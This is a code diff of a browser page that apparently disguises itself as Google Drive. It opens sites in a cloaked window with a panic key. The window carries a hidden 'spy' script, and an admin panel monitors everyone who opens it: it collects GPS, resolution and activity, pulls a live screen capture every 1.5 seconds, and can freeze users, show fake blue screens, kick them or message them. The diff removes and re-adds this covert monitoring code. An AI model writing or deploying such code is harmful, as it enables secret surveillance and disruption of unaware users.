-                                    update(myRef, { lastCap: c.toDataURL('image/webp', 0.2), capReq: false });
-                                });
-                            }
-                            if(d && (d.kicked || d.bsod || d.frozen)) { window.close(); }
-                        });
-                    <\/script>
-                `;
-
-                if(state.cfg.mode === 'blob') {
-                    const html = `
-                        <!DOCTYPE html>
-                        <html><head>
-                        <title>My Drive - Google Drive</title>
-                        <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
-                        <style>body,html{margin:0;padding:0;height:100vh;overflow:hidden;background:#000;}iframe{width:100%;height:100%;border:none;}</style>
-                        </head><body>
-                        <iframe src="${url}" allowfullscreen></iframe>
-                        ${spy}
-                        </body></html>
-                    `;
+                if(s.cfg.mode === 'blob') {
+                    const html = `<html><head><title>My Drive - Google Drive</title><link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png"><style>body,html{margin:0;padding:0;height:100vh;overflow:hidden;background:#000}iframe{width:100%;height:100%;border:none}</style></head><body><iframe src="${url}"></iframe>${spy}</body></html>`;
                     const blob = new Blob([html], {type:'text/html'});
-                    state.win = window.open(URL.createObjectURL(blob), '_blank');
+                    s.win = window.open(URL.createObjectURL(blob), '_blank');
                 } else {
-                    state.win = window.open(url, '_blank');
+                    s.win = window.open(url, '_blank');
                 }
             },
-
             panic: () => {
-                if(state.win) state.win.close();
-                window.location.replace(state.cfg.url);
+                if(s.win) s.win.close();
+                window.location.replace(s.cfg.url);
             },
-
             saveCfg: () => {
-                state.cfg.url = document.getElementById('cfgUrl').value;
-                state.cfg.mode = document.getElementById('cfgMode').value;
-                localStorage.setItem('mUrl', state.cfg.url);
-                localStorage.setItem('mMode', state.cfg.mode);
-                localStorage.setItem('mKey', state.cfg.key);
-                alert('CONFIG SAVED');
-                ui.toggle('settingsPanel');
+                s.cfg.url = document.getElementById('cfg-url').value;
+                s.cfg.mode = document.getElementById('cfg-mode').value;
+                s.cfg.key = document.getElementById('cfg-key').value;
+                localStorage.setItem('mUrl', s.cfg.url);
+                localStorage.setItem('mMode', s.cfg.mode);
+                localStorage.setItem('mKey', s.cfg.key);
+                alert("SETTINGS SAVED");
+                ui.closeModals();
             }
         };
 
-        // 5. ADMIN CONTROLLER
+        // ADMIN CONTROLLER
         window.adm = {
             init: () => {
-                onValue(ref(db, 'presence'), s => {
-                    const list = document.getElementById('userList'); list.innerHTML = '';
-                    s.forEach(u => {
+                onValue(ref(db, 'presence'), snap => {
+                    const list = document.getElementById('user-list-view'); list.innerHTML = '';
+                    snap.forEach(u => {
                         const val = u.val();
-                        const d = document.createElement('div');
-                        d.className = `user-item ${state.admin.selected === u.key ? 'active' : ''}`;
-                        let icon = '🟢';
-                        if(val.frozen) icon = '❄️'; if(val.bsod) icon = '☠️';
+                        const row = document.createElement('div');
+                        row.className = `user-row ${s.adm.sel === u.key ? 'selected' : ''}`;
+                        row.innerHTML = `<span>${val.frozen?'❄️':(val.bsod?'☠️':'🟢')} ${val.name}</span> <span>${val.activity.substring(0,12)}</span>`;
+                        row.onclick = () => adm.select(u.key, val);
+                        list.appendChild(row);
                         
-                        d.innerHTML = `<span>${icon} ${val.name}</span><span style="color:#666">${val.activity.substring(0,15)}</span>`;
-                        d.onclick = () => adm.select(u.key, val);
-                        list.appendChild(d);
-                        
-                        // Live Update Preview if selected
-                        if(state.admin.selected === u.key && val.lastCap) {
-                            document.getElementById('monitor').style.backgroundImage = `url(${val.lastCap})`;
+                        if(s.adm.sel === u.key && val.lastCap) {
+                            document.getElementById('monitor-view').style.backgroundImage = `url(${val.lastCap})`;
                         }
                     });
                 });
             },
-            
             select: (key, val) => {
-                state.admin.selected = key;
-                document.getElementById('intel').innerHTML = `
-                    <b>TARGET:</b> ${val.name} <br>
-                    <b>RES:</b> ${val.res} | <b>GPS:</b> ${val.gps||'N/A'} <br>
-                    <b>STATUS:</b> ${val.activity}
+                s.adm.sel = key;
+                document.getElementById('target-info').innerHTML = `
+                    ID: ${key.substring(0,5)}... | RES: ${val.res}<br>
+                    GPS: ${val.gps || 'N/A'}<br>
+                    ACT: ${val.activity}
                 `;
-                adm.init(); // Re-render to highlight
+                adm.init();
             },
-
-            act: (action) => {
-                if(!state.admin.selected) return;
-                onValue(ref(db, `presence/${state.admin.selected}/${action}`), s => {
-                    update(ref(db, `presence/${state.admin.selected}`), { [action]: !s.val() });
+            cmd: (act) => {
+                if(!s.adm.sel) return;
+                onValue(ref(db, `presence/${s.adm.sel}/${act}`), snap => {
+                    update(ref(db, `presence/${s.adm.sel}`), { [act]: !snap.val() });
                 }, {onlyOnce:true});
             },
-
             watch: () => {
-                const btn = document.getElementById('watchBtn');
-                const tag = document.getElementById('liveTag');
-                if(state.admin.watchTimer) {
-                    clearInterval(state.admin.watchTimer); state.admin.watchTimer = null;
-                    btn.innerText = '👁️ WATCH'; tag.style.display = 'none';
+                const btn = document.getElementById('btn-watch');
+                const tag = document.getElementById('live-tag');
+                if(s.adm.timer) {
+                    clearInterval(s.adm.timer); s.adm.timer=null;
+                    btn.innerText = "👁️ WATCH"; btn.style.color="#fff"; tag.style.display="none";
                 } else {
-                    if(!state.admin.selected) return;
-                    btn.innerText = '⏹ STOP'; tag.style.display = 'block';
-                    state.admin.watchTimer = setInterval(() => {
-                        update(ref(db, `presence/${state.admin.selected}`), { capReq: true });
-                    }, 1500);
+                    if(!s.adm.sel) return;
+                    btn.innerText = "⏹ STOP"; btn.style.color="var(--accent)"; tag.style.display="block";
+                    s.adm.timer = setInterval(() => update(ref(db, `presence/${s.adm.sel}`), {capReq:true}), 1500);
                 }
             },
-            
-            nuke: () => {
-                if(confirm('NUKE ALL CONNECTIONS?')) {
-                    onValue(ref(db, 'presence'), s => s.forEach(u => update(ref(db,`presence/${u.key}`),{reload:true})), {onlyOnce:true});
-                }
+            chat: () => {
+                if(!s.adm.sel) return;
+                const msg = prompt("SEND MESSAGE:");
+                if(msg) update(ref(db, `presence/${s.adm.sel}`), { msg: msg });
             }
         };
 
-        // 6. GLOBAL LISTENERS
-        // Key Binding Logic
-        const keyInp = document.getElementById('cfgKey');
-        keyInp.onclick = () => {
-            keyInp.value = '[ PRESS KEY ]';
-            keyInp.style.color = 'var(--primary)';
-            const h = (e) => { e.preventDefault(); state.cfg.key = e.key; keyInp.value = e.key.toUpperCase(); window.removeEventListener('keydown', h); };
-            window.addEventListener('keydown', h);
-        };
-
-        // The Panic Listener (Priority 1)
-        window.addEventListener('keydown', (e) => {
-            if(e.key === state.cfg.key) {
-                e.stopImmediatePropagation();
-                e.preventDefault();
-                sys.panic();
-            }
+        // LISTENERS
+        const kInp = document.getElementById('cfg-key');
+        kInp.onclick = () => { kInp.value="[PRESS]"; const h=(e)=>{e.preventDefault(); kInp.value=e.key; window.removeEventListener('keydown',h);}; window.addEventListener('keydown',h); };
+        
+        window.addEventListener('keydown', e => {
+            if(e.key === s.cfg.key) { e.stopImmediatePropagation(); sys.panic(); }
         }, true);
     </script>
 </body>
